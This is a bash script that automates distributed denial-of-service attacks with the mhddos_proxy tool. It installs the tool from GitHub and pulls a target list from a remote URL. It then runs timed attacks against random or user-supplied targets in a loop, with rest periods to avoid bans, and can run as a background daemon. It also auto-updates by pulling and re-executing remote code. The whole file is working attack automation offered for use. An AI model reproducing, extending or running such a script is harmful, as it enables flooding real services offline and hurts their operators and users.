#!/bin/bash

# exit on error
set -e

# settings
my_name=auto_mhddos
my_exe=/usr/local/bin/$my_name
my_dir=/opt/$my_name
my_log=/var/log/$my_name
my_path=$(readlink -f "$0")

auto_repo='https://github.com/girador/auto.git'
auto_dir=$my_dir/auto
tool_repo='https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git'
tool_dir=$my_dir/tool

my_ulimit=1048576
attack_timeout=20m
targets='https://raw.githubusercontent.com/girador/res/main/targets.txt'

# kill child processes on ctrl+c
trap 'kill $(jobs -p) 2>/dev/null' INT

# functions

print_log() { echo "$(date +"%Y-%m-%d %T") | $*"; }
print_red() { echo -e "\e[7;31m$(print_log "$@")\e[0m"; }
print_green() { echo -e "\e[7;32m$(print_log "$@")\e[0m"; }
print_blue() { echo -e "\e[7;36m$(print_log "$@")\e[0m"; }

self_help() {

	echo '
mhddos_proxy attacks automation
With intervals, timeouts, random targets, target autoupdate and ability to run custom mhddos_proxy attack
'"$my_name"' ACTION:
	help | -h | --help
		show this help meesage
	install
		installs/reinstalls/updates '"$my_name"' and its dependencies
		'"$my_name"' becomes available as command in shell
	run OPTIONS...
		Run attack in foreground, with random targets or with custom targets
		OPTIONS will be passed to mhddos_proxy as is: https://github.com/porthole-ascend-cinnamon/mhddos_proxy#cli
		Examples:
			Run attack on random targets with default OPTIONS:
				'"$my_name"' run
			Run attack on random targets with custom OPTIONS passed to mhddos_proxy:
				'"$my_name"' run --threads 2000 --rpc 1000 --debug
			Run your custom targets:
				'"$my_name"' run custom https://YOURTARGETS... OPTIONS...
	start OPTIONS...
		The same as run, but starts the attack in screen session as a service/daemon
		The name of screen session will be: PID.'"$my_name"'.DATE_TIME_COMMAND
	status ATTACK
		Show load and ATTACK status:
		- process tree
		- last 20 records from ATTACK log
		If no ATTACK provided, shows the status of all running attacks initiated by '"$my_name"'
		Partial ATTACK name is accepted, e.g. "11:55" instead of 9936.auto_mhddos.22-04-06_11:55:35_threads_2000_rpc_1000_debug
	stop ATTACK
		Stops ATTACK, partial name is also accepted
		If no ATTACK provided, stops all found running attacks initiated by '"$my_name"'
	remove
		Removes '"$my_name"' components, found running attacks and logs
	'
	return

}

main() {

	arg="$1"
	shift || true
	case "$arg" in
	help | -h | --help)
		self_help
		;;
	install)
		self_install "$@"
		;;
	run)
		self_run "$@"
		;;
	start)
		self_start "$@"
		;;
	status | '')
		self_status "$@"
		;;
	stop)
		self_stop "$@"
		;;
	remove)
		self_remove "$@"
		;;
	*)
		print_red "No such option: '$arg'" >&2
		return 1
		;;
	esac

}

self_install() {

	print_blue "Installing $my_name"
	apt update -y
	apt install -y \
		gcc libc-dev libffi-dev libssl-dev python3-dev rustc \
		screen \
		git \
		python3 python3-pip
	pip3 install --upgrade pip

	mkdir -p "$my_dir"
	chmod 700 "$my_dir"

	rm -rfv "$auto_dir"
	git clone --depth 1 "$auto_repo" "$auto_dir"
	if [ -f "$auto_dir"/"$my_name" ]; then
		ln -sf "$auto_dir"/"$my_name" "$my_exe"
	else
		install -m 0700 "$my_path" "$my_exe" || true
	fi

	rm -rfv "$tool_dir"
	git clone --depth 1 "$tool_repo" "$tool_dir"
	pip3 install -r "$tool_dir"/requirements.txt

	apt autoremove -y

	print_green "$my_name installed"

}

self_run() {

	ulimit -n "$my_ulimit"

	if [ "$1" == custom ]; then
		shift
		target_mode=custom
	fi

	while true; do

		print_blue "Updating the repos..."
		tool_pull=$(git -C "$tool_dir" pull origin main)
		grep -q "Already.*up.*to.*date" <<<"$tool_pull" || {
			print_blue "Tool repo updated, updating the requirements..."
			pip3 install -r "$tool_dir"/requirements.txt
			print_green "Tool requirements updated"
		}
		auto_pull=$(git -C "$auto_dir" pull origin main)
		grep -q "Already.*up.*to.*date" <<<"$auto_pull" || {
			print_blue "$my_name repo updated, restarting the task with the new version of script..."
			"$my_path" install
			target_mode="$target_mode" "$my_path" run "$@"
			return
		}
		
		cd "$tool_dir"

		if [ "$target_mode" = custom ]; then
			print_blue "Custom target: $*"
			python3 "$tool_dir"/runner.py "$@" &
			attack_pid=$!
		else
			print_blue "Parsing targets from $targets"
			target_list=$(curl -s "$targets" | grep "^[^#]")

			target_quantity=$(wc -l <<<"$target_list")
			print_blue "Number of targets in list: $target_quantity"

			target_random=$(shuf -i 1-"$target_quantity" -n 1)
			target_cmd=$(sed "$target_random"'q;d' <<<"$target_list")
			print_blue "Random target: $target_random: $target_cmd"

			python3 "$tool_dir"/runner.py $target_cmd "$@" &
			attack_pid=$!
		fi

		print_green "Running attack for $attack_timeout: PID $attack_pid"
		sleep "$attack_timeout"
		print_blue "$attack_timeout of attack elapsed"
		kill -- -"$attack_pid" 2>/dev/null || kill "$attack_pid" || true
		print_green "Attack stopped: PID $attack_pid"

		attack_sleep=$(shuf -i 2-6 -n 1)m
		print_blue "Sleeping $attack_sleep without attack to protect your machine from ban..."
		sleep "$attack_sleep"
		print_blue "Restarting..."

	done

}

self_start() {

	attack_name="$(date +"%y-%m-%d_%T")"_"$(tr " " "_" <<<"$*" | tr -dc _A-Za-z0-9 | head -c30)"
	mkdir -p "$my_log"
	chmod 0700 "$my_log"
	echo ''"$my_log"'/*.log
{
	rotate 7
	daily
	missingok
	notifempty
	compress
}' >/etc/logrotate.d/"$my_name"
	attack_log="$my_log"/"$attack_name".log
	print_blue "Starting attack $attack_name"
	screen -dmS "$my_name"."$attack_name" -L -Logfile "$attack_log" "$my_path" run "$@"
	print_green "Attack $attack_name started"

}

attack_init() {

	attack_list=$(screen -ls | awk '{print $1}' | grep "\.${my_name}\.") || {
		print_red "No attacks running" >&2
		return 1
	}
	for attack_init; do
		attack_name=$(grep -m1 "$1" <<<"$attack_list") || {
			print_red "No such attack: $attack_init" >&2
			return 1
		}
	done

}

self_status() {

	print_blue "Load: $(cat /proc/loadavg)"
	if [ $# = 0 ]; then
		attack_init
		set -- $attack_list
	fi
	for self_status; do
		attack_init "$self_status"
		print_blue "Status of attack $attack_name"
		pstree -al "$(cut -d. -f1 <<<"$attack_name")"
		tail -100 "$my_log"/"$(cut -d. -f3 <<<"$attack_name")".log | sed 's/^/\t/'
		echo -e "\e[0m"
	done

}

self_stop() {

	if [ $# = 0 ]; then
		attack_init
		set -- $attack_list
	fi
	for self_stop; do
		attack_init "$self_stop"
		print_blue "Stopping attack $attack_name"
		kill -- -"$(cut -d. -f1 <<<"$attack_name")"
		print_green "Attack $attack_name stopped"
	done

}

self_remove() {

	print_blue "Removing $my_name"
	self_stop || true
	rm -rfv "$my_exe" "$my_dir" "$my_log" /etc/logrotate.d/"$my_name"
	print_green "$my_name removed"

}

main "$@"
